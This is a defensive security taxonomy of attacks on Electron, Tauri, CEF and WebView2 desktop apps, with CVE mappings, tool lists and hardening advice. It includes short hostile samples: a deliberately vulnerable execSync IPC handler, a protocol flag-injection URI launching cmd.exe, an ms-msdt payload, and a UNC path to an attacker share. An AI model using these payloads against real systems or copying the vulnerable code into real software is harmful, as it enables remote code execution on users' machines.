# Desktop Hybrid App Security — Mutation/Variation Taxonomy

---

## Classification Structure

Desktop hybrid applications embed a web rendering engine (Chromium, system WebView) alongside a native runtime (Node.js, Rust, C++) to deliver cross-platform desktop experiences built with web technologies. This architectural duality — a **privileged native layer** coexisting with an **unprivileged web layer** inside a single process tree — creates a unique and expansive attack surface that neither pure-web nor pure-native applications exhibit.

The taxonomy below classifies every known mutation by **what structural component is targeted** (Axis 1), cross-referenced against the **type of security boundary violated** (Axis 2) and the **weaponization scenario** (Axis 3).

### Axis 2 — Security Boundary Violation Types (Cross-Cutting)

These discrepancy types apply across all categories and explain *why* each mutation works:

| Code | Violation Type | Description |
|------|---------------|-------------|
| **V1** | Privilege Boundary Crossing | Renderer/web context gains access to main/native process capabilities |
| **V2** | Context Isolation Bypass | JavaScript in the web world reaches into the isolated preload/native context |
| **V5** | Code Integrity Violation | Unsigned or tampered code executes as if it were legitimate application code |
| **V6** | Input Validation Failure | Untrusted input crosses a trust boundary without proper sanitization |
| **V7** | Trust Boundary Confusion | The framework or app conflates trusted and untrusted origins/contexts |
| **V8** | Patch Gap Exploitation | Known upstream vulnerability remains unpatched in the embedded engine |

### Axis 3 — Weaponization Scenarios

| Code | Scenario | Typical Impact |
|------|----------|----------------|
| **W1** | Remote Code Execution | Arbitrary OS command execution from web content or remote input |
| **W2** | Local Privilege Escalation | Low-privilege process gains higher OS privileges via the hybrid app |
| **W3** | Data Exfiltration / Credential Theft | Secrets, tokens, cookies, or files extracted from the application |
| **W4** | Persistence / Backdoor Installation | Attacker maintains access through app modification or injection |
| **W5** | OS Security Control Bypass | TCC, Gatekeeper, SIP, or similar controls are circumvented |
| **W6** | Supply Chain Compromise | Malicious code enters through dependencies, plugins, or updates |
| **W7** | UI Spoofing / Phishing | User is deceived through overlays, navigation, or protocol abuse |

### Frameworks in Scope

| Framework | Native Runtime | Rendering Engine | Architecture |
|-----------|---------------|-----------------|--------------|
| **Electron** | Node.js (bundled) | Chromium (bundled) | Multi-process, IPC bridge |
| **Tauri** | Rust | System WebView (WRY) | Strict capability model |
| **CEF** | C/C++ host | Chromium (bundled) | Embeddable, minimal sandbox |
| **WebView2** | .NET/C++ host | Edge/Chromium (shared) | System-managed runtime |

---

## §1. IPC Bridge & Message Channel Attacks

The Inter-Process Communication layer is the single most critical trust boundary in hybrid desktop applications. It mediates every interaction between the untrusted web frontend and the privileged native backend. Misconfigurations or design flaws in this layer convert web-level vulnerabilities (XSS) into OS-level exploits (RCE).

### §1-1. Unrestricted IPC Handler Exposure

When the native/main process registers IPC handlers that perform privileged operations (file I/O, process spawning, shell commands) without restricting which renderers may invoke them, any renderer with script execution can escalate to full native capabilities.

| Subtype | Mechanism | Violation | Key Condition |
|---------|-----------|-----------|---------------|
| **Overprivileged handler** | Main process IPC handler performs `child_process.exec()`, `fs.writeFile()`, or similar without sender validation | V1, V6 | Handler accepts arbitrary arguments from any renderer |
| **Missing sender validation** | `ipcMain.handle()` does not check `event.senderFrame` or `event.sender.getURL()` origin | V7 | Application loads remote or untrusted content in any renderer |
| **iFrame IPC leakage** | Embedded iFrames within a renderer can send IPC messages to the main process without origin validation | V7 | No cryptographic invoke-key or origin allowlist (CVE-2024-35222 in Tauri) |
| **Broadcast channel abuse** | IPC messages dispatched to all renderers (`webContents.send()`) leak sensitive data to untrusted windows | V7 | Application uses broadcast-style IPC without per-window filtering |

**Example — Overprivileged Handler:**
```javascript
// VULNERABLE: Main process
ipcMain.handle('run-command', (event, cmd) => {
  return require('child_process').execSync(cmd).toString();
});
// Any XSS in any renderer → full RCE
```

### §1-2. IPC Message Injection and Manipulation

Even when IPC handlers are properly scoped, the message content itself may be manipulated to achieve unintended effects.

| Subtype | Mechanism | Violation | Key Condition |
|---------|-----------|-----------|---------------|
| **Argument injection** | Renderer passes crafted arguments to IPC handler that are interpolated into shell commands or SQL queries | V6 | Handler constructs commands via string concatenation |
| **Type confusion in IPC** | Handler expects a string but receives an object with `toString()` override or prototype pollution payload | V6, V2 | No schema validation on IPC message payload |
| **Serialization gadget** | Structured clone or JSON deserialization of IPC message triggers unintended object instantiation | V6 | Custom objects transmitted across IPC boundary |

### §1-3. Tauri Command System Exploitation

Tauri's Rust-based command system offers a fundamentally different IPC model with compile-time capability declarations, but introduces its own mutation space.

| Subtype | Mechanism | Violation | Key Condition |
|---------|-----------|-----------|---------------|
| **Capability over-provisioning** | `tauri.conf.json` grants broad permissions (e.g., `fs:default` instead of scoped paths) to frontend windows | V1 | Developer grants blanket permissions for convenience |
| **Scope escape via path traversal** | Filesystem scope restrictions bypassed through improper escaping of special characters in file dialog selections | V6 | Paths from drag-and-drop or file dialogs not re-validated |
| **IPC invoke-key bypass** | Prior to Tauri 2.0-beta.20, iFrames could access IPC endpoints without the cryptographic invoke key | V7 | Remote-origin iFrame loaded within a Tauri webview |
| **Command argument injection** | Tauri command accepting string arguments used in `std::process::Command` without sanitization | V6 | User-controlled input reaches shell execution path |

---

## §2. Preload Script & Context Bridge Vulnerabilities

Preload scripts execute in a privileged context before renderer code loads, bridging the gap between the web world and Node.js/native APIs. The `contextBridge` API (Electron) was designed to create a safe exposure surface, but improper use or inherent limitations create exploitable gaps.

### §2-1. Overprivileged API Exposure

The most common preload vulnerability is exposing too much functionality through the bridge, transforming a controlled API surface into an arbitrary execution primitive.

| Subtype | Mechanism | Violation | Key Condition |
|---------|-----------|-----------|---------------|
| **Raw ipcRenderer pass-through** | Preload exposes the entire `ipcRenderer` module via `contextBridge`, allowing renderers to send arbitrary IPC messages | V1 | `contextBridge.exposeInMainWorld('ipc', ipcRenderer)` |
| **Dangerous function exposure** | Preload exposes `child_process.exec`, `fs` methods, or `require()` directly to the web context | V1 | Bridge API includes shell execution or module loading |
| **eval/Function constructor exposure** | Preload passes `eval()` or `new Function()` capability to the web world | V1, V2 | Dynamic code execution bridge for "flexibility" |
| **Module loader exposure** | Preload exposes `require()` or `__non_webpack_require__` through the bridge | V1 | Web context gains full Node.js module system access |

**Example — Raw ipcRenderer Leak:**
```javascript
// VULNERABLE preload.js
const { contextBridge, ipcRenderer } = require('electron');
contextBridge.exposeInMainWorld('api', {
  send: ipcRenderer.send,        // Leaks full ipcRenderer
  invoke: ipcRenderer.invoke,    // Attacker can call ANY handler
  on: ipcRenderer.on
});
```

### §2-2. Context Isolation Bypass

Even with `contextIsolation: true`, various techniques allow web-world JavaScript to reach into the isolated preload context.

| Subtype | Mechanism | Violation | Key Condition |
|---------|-----------|-----------|---------------|
| **Prototype pollution across bridge** | Polluting `Object.prototype` in the web world affects objects returned by `contextBridge` when they contain non-serializable types (canvas contexts, etc.) | V2 | Bridge returns objects containing non-cloneable JavaScript values |
| **V8 memory corruption** | Type confusion or use-after-free in V8 allows one JavaScript context to read/write memory of another, bypassing context isolation entirely | V2, V3 | Unpatched V8 vulnerability + Electron patch gap |
| **Obsolete feature exploitation** | Legacy Electron features (e.g., `webFrame.executeJavaScript` in old versions) allow cross-context code execution | V2 | Application runs on outdated Electron version |
| **contextIsolation disabled** | Application explicitly sets `contextIsolation: false`, allowing web code to directly prototype-pollute preload globals | V2 | Misconfiguration in `webPreferences` |

---

## §3. Navigation & URL Handling

Desktop hybrid apps must handle URLs across multiple trust boundaries: custom protocol schemes, deep links, external URL opening, and internal navigation between trusted and untrusted origins. Each transition point is a potential injection vector.

### §3-1. Custom Protocol Handler Exploitation

Applications register custom URI schemes (e.g., `myapp://`, `vscode://`) to enable deep linking. On Windows, protocol handler arguments are passed directly to the executable command line.

| Subtype | Mechanism | Violation | Key Condition |
|---------|-----------|-----------|---------------|
| **Command-line argument injection** | On Windows, the custom URI scheme handler passes the full URL to the executable; special characters in the URL inject Chromium command-line flags | V6, V1 | CVE-2018-1000006; registry entry lacks `--` separator |
| **Flag injection via protocol** | Attacker crafts URI like `myapp://?--no-sandbox --gpu-launcher=cmd.exe /c calc` to inject process flags | V3, V6 | Windows protocol handler without argument sanitization |
| **Protocol handler MITM** | Attacker registers a competing protocol handler on the system, intercepting deep links meant for the legitimate app | V7 | No exclusive protocol registration; first-come-first-served on some OS |
| **Navigation to untrusted origin** | Deep link triggers navigation to attacker-controlled URL within the privileged BrowserWindow | V7 | No allowlist validation on deep link URL parameter |

### §3-2. `shell.openExternal()` Abuse

The `shell.openExternal()` API opens a URL using the system's default handler. When called with untrusted input, it becomes a command injection primitive.

| Subtype | Mechanism | Violation | Key Condition |
|---------|-----------|-----------|---------------|
| **Arbitrary protocol execution** | Even if `file:` URLs are filtered, attackers use other registered URI handlers (`ms-msdt:`, `search-ms:`, `calculator:`) to execute OS commands | V6, V1 | URL allowlist only blocks `file:` and `javascript:` |
| **UNC path execution** | `shell.openExternal('\\\\attacker\\share\\payload.exe')` on Windows triggers SMB connection and potential executable download | V6 | No UNC/backslash filtering |
| **`file:` protocol bypass** | Case variations (`FILE:`, `File:`) or URL-encoded forms bypass naive string matching filters | V6 | Case-sensitive or incomplete protocol validation |
| **`data:` URI execution** | `data:text/html,<script>...</script>` may be opened in a browser context with unexpected privileges | V6 | `data:` protocol not blocked |

**Example — ms-msdt Protocol Attack:**
```
shell.openExternal('ms-msdt:/id PCWDiagnostic /skip force /param "IT_RebsrowseForFile=?/../../$(calc)"')
```

### §3-3. WebContents Navigation Control

Navigation within `BrowserWindow` and `webview` tags must be constrained to prevent the application from loading attacker-controlled content in a privileged context.

| Subtype | Mechanism | Violation | Key Condition |
|---------|-----------|-----------|---------------|
| **Uncontrolled `will-navigate`** | Application does not register a `will-navigate` handler, allowing renderer-initiated navigation to arbitrary URLs | V7 | No navigation event listener on BrowserWindow |
| **`new-window` event bypass** | Attacker triggers window creation with elevated `webPreferences` by exploiting unhandled `new-window` / `setWindowOpenHandler` | V1, V7 | Default window creation inherits parent preferences |
| **`window.open()` with features** | Renderer creates a new window with `nodeIntegration` or `sandbox:false` via `window.open` features string | V1 | `nativeWindowOpen` or old Electron versions |

---

## §4. Update Mechanism Attacks

Auto-update is a critical security feature (closing patch gaps) but also a high-value attack surface — a compromised update channel delivers signed, persistent RCE to every user.

### §4-1. Signature Validation Bypass

| Subtype | Mechanism | Violation | Key Condition |
|---------|-----------|-----------|---------------|
| **Publisher name mismatch** | `electron-updater` validates updates by comparing `publisherName` in the manifest with the certificate's Common Name; environment variable expansion in the validation command allows bypass | V5 | electron-updater < 6.3.0-alpha.6 |
| **Squirrel.Windows no validation** | Squirrel.Windows update framework does not implement signature validation at all | V5 | Application uses Squirrel.Windows without additional verification |
| **Certificate pinning absence** | Update manifest fetched over HTTPS but without certificate pinning; MITM on corporate/public networks can substitute the manifest | V5, V6 | No certificate pinning on update server connection |
| **Hash verification bypass** | Update binary hash checked against manifest-provided hash; MITM replaces both manifest and binary simultaneously | V5 | No independent verification channel (e.g., transparency log) |

### §4-2. Update Channel Exploitation

| Subtype | Mechanism | Violation | Key Condition |
|---------|-----------|-----------|---------------|
| **Downgrade attack** | Attacker intercepts update check and serves a manifest with an older, vulnerable version number | V5, V8 | No monotonic version enforcement |
| **Update server compromise** | Attacker gains access to the update server (S3 bucket, CDN) and replaces the update binary | V5, V6 | Insufficient access controls on update infrastructure |
| **DNS-based MITM** | Redirecting the update domain to an attacker-controlled server via DNS poisoning or compromise | V5 | Update URL resolved via DNS without DNSSEC or pinning |
| **Local update proxy injection** | On corporate networks, proxy can intercept and modify update traffic | V5 | HTTP update channel or weak HTTPS validation |

### §4-3. Tauri Update Security

| Subtype | Mechanism | Violation | Key Condition |
|---------|-----------|-----------|---------------|
| **Signature key compromise** | Tauri's updater uses Ed25519 signatures with a public key embedded in the binary; compromise of the private key allows malicious updates | V5 | Private key stored insecurely |
| **Update endpoint redirect** | If the update endpoint URL is configurable or injectable, attacker can redirect to a malicious update server | V5, V6 | Dynamic update URL resolution |

---

## §5. Credential & Data Storage

Desktop hybrid apps store authentication tokens, API keys, cookies, and sensitive user data locally. The storage mechanisms range from plaintext JSON files to OS-provided keychains, each with distinct attack surfaces.

### §5-1. Insecure Local Storage

| Subtype | Mechanism | Violation | Key Condition |
|---------|-----------|-----------|---------------|
| **Plaintext token storage** | Authentication tokens stored in `localStorage`, `sessionStorage`, or electron-store JSON files without encryption | V3 | No use of `safeStorage` or OS keychain |
| **Unencrypted SQLite databases** | Chromium's cookie and Web SQL databases stored in plaintext when `EnableCookieEncryption` fuse is disabled | V3 | Default Electron configuration on some platforms |
| **electron-store encryption weakness** | CBC-mode AES encryption vulnerable to padding oracle attacks; encryption key derivable from application source | V3 | Using electron-store's built-in "encryption" |
| **Config file secrets** | API keys, webhook URLs, or database credentials stored in readable JSON/YAML configuration files | V3 | Developer convenience; no separation of secrets |

### §5-2. Session and Cookie Theft

| Subtype | Mechanism | Violation | Key Condition |
|---------|-----------|-----------|---------------|
| **WebView2 cookie injection** | WebView2 applications can inject JavaScript to log keystrokes or steal authentication cookies, enabling MFA bypass | V3, V7 | Malicious WebView2 app loading legitimate login pages |
| **Session partition misconfiguration** | Multiple webviews sharing the same session partition leak cookies and storage between trusted and untrusted origins | V7 | No `partition` attribute or shared `persist:` prefix |
| **Cookie extraction from disk** | Direct read of Chromium cookie database file (`Cookies` in user data directory) | V3 | Filesystem access to the app's user data directory |

---

## §6. Content Security Policy & Web Security Bypasses

Web security mechanisms (CSP, CORS, SOP) behave differently in desktop hybrid apps due to the `file://` origin, custom schemes, and the presence of Node.js integration.

### §6-1. CSP Enforcement Gaps

| Subtype | Mechanism | Violation | Key Condition |
|---------|-----------|-----------|---------------|
| **CSP absent or permissive** | Application loads from `file://` without any CSP meta tag or HTTP header; all inline scripts and `eval()` allowed | V6 | No CSP defined for local content |
| **Webview tag CSP bypass** | CSP on the parent BrowserWindow does not apply to `<webview>` tags; scripts in webview have independent security context | V7 | Webview loads untrusted content without its own CSP |
| **`unsafe-eval` for framework compatibility** | Application requires `unsafe-eval` for bundler output (Webpack dev, Vue templates), leaving eval-based injection vectors open | V6 | Framework compilation requires runtime eval |
| **Custom scheme CSP** | CSP rules designed for HTTPS origins may not apply to custom Electron schemes (`app://`, `electron://`) | V7 | Origin-based CSP rules don't match custom scheme origins |

### §6-2. Origin and CORS Anomalies

| Subtype | Mechanism | Violation | Key Condition |
|---------|-----------|-----------|---------------|
| **`null` origin from file://** | Local `file://` URLs have a `null` origin; many servers accept `Origin: null` in CORS preflight, bypassing origin restrictions | V7 | Server-side CORS configuration accepts null origin |
| **`webSecurity: false`** | Disabling web security removes SOP and CORS enforcement entirely in the renderer | V7 | Developer sets `webSecurity: false` for local development, ships it to production |
| **Custom scheme privilege** | Electron custom protocols registered with `privileged: true` gain abilities like making fetch requests or being used as video/audio sources without CORS | V7 | Overly broad protocol registration |

---

## §7. Supply Chain & Dependency Attacks

Desktop hybrid apps have uniquely deep supply chains: npm/crate ecosystems for application code and the embedded browser engine itself, each introducing distinct compromise vectors.

### §7-1. Package Ecosystem Compromise

| Subtype | Mechanism | Violation | Key Condition |
|---------|-----------|-----------|---------------|
| **Direct dependency hijacking** | Widely-used npm packages (e.g., `debug`, `chalk` — Sept 2025 incident affecting 2.6B weekly downloads) compromised via maintainer phishing | V6 | Application depends on compromised package |
| **Typosquatting** | Malicious packages with names similar to popular Electron utilities published to npm | V6 | Developer installs wrong package |
| **Dependency confusion** | Private package names squatted on public npm registry; build system fetches malicious public version | V6 | Mixed private/public registry configuration |
| **Post-install script execution** | npm package `postinstall` scripts execute arbitrary code during `npm install`, before any review | V6 | Unrestricted lifecycle script execution |
| **Self-propagating worm** | Shai-Hulud-style npm worms use post-install scripts to infect other packages, creating secondary and tertiary infections | V6 | No package lockfile integrity verification |

### §7-2. Embedded Engine Patch Lag

| Subtype | Mechanism | Violation | Key Condition |
|---------|-----------|-----------|---------------|
| **Chromium N-day in Electron** | Known Chromium vulnerability patched upstream but not yet in the Electron release; attackers target the gap window | V8 | Electron version pinned to vulnerable Chromium |
| **CEF version freeze** | CEF-based apps (Steam, game launchers) may run Chromium versions months behind, accumulating known vulnerabilities | V8 | Infrequent CEF updates; complex update pipeline |
| **WebView2 runtime lag** | WebView2 uses the system Edge installation, which updates independently but may be delayed by enterprise policies | V8 | Corporate environment blocking Edge updates |

---

---

## Attack Scenario Mapping (Axis 3)

| Scenario | Architecture | Primary Mutation Categories |
|----------|-------------|---------------------------|
| **W1: XSS → RCE** | Electron with nodeIntegration or weak preload | §1 + §2 |
| **W1: Chromium N-day → RCE** | Any Chromium-based hybrid app with patch gap | §7-2 |
| **W1: Deep Link → RCE** | Windows protocol handler + command injection | §3-1 + §3-2 |
| **W3: Cookie/Credential Theft** | WebView2 session capture | §5-2 |
| **W4: ASAR Persistence** | Local attacker + unvalidated ASAR | §4-1 |
| **W6: Supply Chain RCE** | npm compromise → Electron app infection | §7-1 |
| **W1: IPC Escalation** | XSS + overprivileged IPC handler | §1-1 + §2-1 |

---

## CVE / Bounty Mapping (2018–2025)

| Mutation Combination | CVE / Case | Impact / Bounty |
|---------------------|-----------|----------------|
| §3-1 (Protocol handler injection) | CVE-2018-1000006 (Electron) | RCE on Windows via custom URI scheme argument injection |
| §4-1 (Signature validation bypass) | electron-updater signature bypass (2020) | RCE via MITM update; environment variable expansion in validation |
| §1-3 (Tauri iFrame IPC bypass) | CVE-2024-35222 (Tauri) | iFrames bypass origin checks for IPC access control |
| §1-3 (Rust command injection) | CVE-2024-24576 (Rust std) | Command injection on Windows affecting Tauri apps using `Command::new()` |
| §4-1 (ASAR integrity bypass) | CVE-2024-46992 (Electron) | ASAR integrity check bypassable by content modification |
| §4-1 (ASAR integrity bypass) | CVE-2025-55305 (Electron) | ASAR integrity bypass via resource modification |
| §7-2 (Chromium N-day patch gap) | CVE-2025-4609 (Chromium) | $250,000 bounty; sandbox escape → RCE; affected Cursor and Windsurf |
| §7-1 (npm supply chain) | npm Shai-Hulud worm (Sept 2025) | 18 packages, 2.6B weekly downloads; self-propagating malware |
| §4-1 (ASAR persistence) | Slack ASAR injection (pentest case) | Persistence via PowerShell payload in `electron.asar` |
| §1 + §2 + §7-2 (IPC XSS → context isolation bypass → Chromium N-day chain) | Pwn2Own Vancouver 2023 — Microsoft Teams (Masato Kinugawa) | Full RCE via 3-bug chain: XSS in chat message → Electron context isolation bypass → sandbox escape via Chromium vulnerability |
| §1-3 (Tauri scope bypass) | GHSA-q9wv-22m9-vhqh (Tauri) | Filesystem scope partially bypassable via special character escaping |

---

## Detection Tools

### Offensive / Auditing Tools

| Tool | Target Scope | Core Technique |
|------|-------------|---------------|
| **Electronegativity** (OSS) | Electron apps | AST/DOM analysis for misconfigurations and security anti-patterns |
| **ElectroNG** (Commercial) | Electron apps | Premium SAST with updated Electron security rules |
| **electron-debug** | Electron apps | Attach Chrome DevTools to running Electron processes |
| **asar** (npm) | Electron ASAR archives | Unpack, inspect, and repack ASAR bundles for code review |
| **nodejsscan** | Node.js code | SAST for Node.js security issues in preload/main process code |
| **Semgrep** (Electron rules) | Electron/JS code | Pattern-based static analysis with community Electron rules |
| **patchdiff** / BinDiff | Chromium/V8 binaries | Identify unpatched vulnerabilities by diffing against latest Chrome |

### Defensive / Hardening Tools

| Tool | Target Scope | Core Technique |
|------|-------------|---------------|
| **@electron/fuses** | Electron build pipeline | Set Electron fuses at build time to disable dangerous features |
| **electron-builder** (fuse config) | Electron packaging | Integrated fuse configuration during application packaging |
| **ASAR integrity validation** | Electron runtime | Build-time hash generation + runtime ASAR tamper detection |
| **Tauri ACL system** | Tauri apps | Compile-time capability and permission declarations |
| **CSP Evaluator** (Google) | Web content | Evaluate and strengthen Content Security Policy configurations |
| **npm audit** / Snyk / Socket | npm dependencies | Dependency vulnerability scanning and supply chain monitoring |

### Research / Fuzzing Tools

| Tool | Target Scope | Core Technique |
|------|-------------|---------------|
| **electron-inject** | Running Electron processes | Runtime code injection for dynamic analysis |
| **chromium-fuzzer** | Chromium/V8 | Coverage-guided fuzzing of browser engine components |
| **ipc-fuzzer** | Electron IPC | Fuzz IPC message handlers with malformed payloads |

---

## Summary: Core Principles

### The Fundamental Architectural Tension

Desktop hybrid app security is defined by a single architectural contradiction: **a privilege-rich native runtime must safely coexist with an untrusted web rendering context within the same process tree**. Every vulnerability in this taxonomy traces back to a failure at this fundamental boundary — whether through direct privilege escalation (IPC abuse, preload exposure), indirect boundary erosion (V8 exploits, sandbox escape), or integrity violations (ASAR tampering, update hijacking).

### Why Incremental Fixes Fail

The hybrid architecture creates a **compound attack surface** that cannot be addressed by fixing any single layer:

1. **Web vulnerabilities gain native impact**: An XSS that would be session-scoped in a browser becomes OS-level RCE in an Electron app with weak isolation.
2. **Patch coordination failure**: Security depends on three independent update cycles — the framework (Electron/Tauri), the embedded engine (Chromium), and the application itself. A patch in any one layer is useless until all three converge.
3. **Permission inheritance**: OS-granted permissions (TCC, entitlements, filesystem access) are attached to the process, not to the code executing within it. Injected code inherits every permission the legitimate application was granted.
4. **Supply chain amplification**: A single compromised npm package can propagate through the dependency tree into thousands of desktop applications, each granting the malicious code full native access.

### Structural Solutions

True mitigation requires **defense in depth across all layers simultaneously**:

- **Minimal privilege surface**: Disable all unnecessary Electron fuses, use Tauri's capability system at maximum granularity, never expose raw IPC or Node.js APIs through the bridge.
- **Aggressive patching**: Automated CI/CD pipelines that rebuild applications within hours of upstream Chromium security releases, not weeks or months.
- **Integrity validation**: ASAR integrity checking, code signing with proper scope, and signed updates with certificate pinning and version monotonicity.
- **Architecture evolution**: Tauri's model (Rust backend, system WebView, compile-time capabilities) represents a structural improvement over Electron's model (bundled Node.js, bundled Chromium, runtime configuration) — but introduces its own trust boundary challenges as the ecosystem matures.

The most dangerous misconception in desktop hybrid app security is that **desktop equals trusted**. Users and developers alike assume that desktop applications operate in a higher-trust environment than web applications. In reality, the hybrid architecture combines the attack surface of the web with the privilege level of native code — creating a threat model that demands vigilance at every layer of the stack.

---

## References

- Electron Security Documentation: https://www.electronjs.org/docs/latest/tutorial/security
- Tauri Security Documentation: https://v2.tauri.app/security/
- Doyensec Electron Security Research: https://blog.doyensec.com/
- Doyensec Awesome Electron.js Hacking: https://github.com/doyensec/awesome-electronjs-hacking
- HackTricks — Electron Desktop Apps: https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/electron-desktop-apps/
- DARKNAVY — Exploiting Steam CEF Framework: https://www.darknavy.org/blog/exploiting_steam_usual_and_unusual_ways_in_the_cef_framework/
- s1r1us — Electron Context Bridge Insecurity: https://s1r1us.ninja/posts/electron-contextbridge-is-insecure/
- Flatt Security — Escaping Electron Isolation: https://flatt.tech/research/posts/escaping-electron-isolation-with-obsolete-feature/
- mr.d0x — Attacking with WebView2: https://mrd0x.com/attacking-with-webview2-applications/
- DeepStrike — Penetration Testing of Electron Applications: https://deepstrike.io/blog/penetration-testing-of-electron-based-applications
- Carettoni (BlackHat Asia 2019) — Preloading Insecurity in Your Electron: https://doyensec.com/resources/Asia-19-Carettoni-Preloading-Insecurity-In-Your-Electron.pdf
- Shabarkin — 0-click RCE in Electron Applications: https://shabarkin.medium.com/0-click-rce-in-electron-applications-1c4f81a2cd6b
- Altpeter — The Dangers of shell.openExternal: https://benjamin-altpeter.de/shell-openexternal-dangers/
- Hexiosec — DLL Hijacking in Electron Apps: https://hexiosec.com/blog/dll-hijacking-and-proxying/
- Doyensec — Electron Updater Signature Bypass: https://blog.doyensec.com/2020/02/24/electron-updater-update-signature-bypass.html
- Doyensec — Building a Secure Electron Auto-Updater: https://blog.doyensec.com/2026/02/16/electron-safe-updater.html
- Theori — Chaining N-days Chrome Renderer RCE: https://theori.io/blog/chaining-n-days-to-compromise-all-part-1-chrome-renderer-rce
- Taggart Tech — Quasar: Compromising Electron Apps: https://taggart-tech.com/quasar-electron/
- YesWeHack — Pentesting Electron Applications: https://blog.yeswehack.com/yeswerhackers/exploitation/pentesting-electron-applications/
- SecureLayer7 — Electron App Security Risks: https://blog.securelayer7.net/electron-app-security-risks/
- Cobalt — Common Misconfigurations in Electron Apps: https://www.cobalt.io/blog/common-misconfigurations-electron-apps-part-1
- Wojciech Regula — Abusing Electron Apps on macOS: https://wojciechregula.blog/post/abusing-electron-apps-to-bypass-macos-security-controls/
- Microsoft — Develop Secure WebView2 Apps: https://learn.microsoft.com/en-us/microsoft-edge/webview2/concepts/security
- "ElectroVolt — Pwning Popular Desktop Apps" (2022) — Systematic Electron exploitation techniques demonstrated against popular desktop applications

---

*This document was created for defensive security research and vulnerability understanding purposes.*
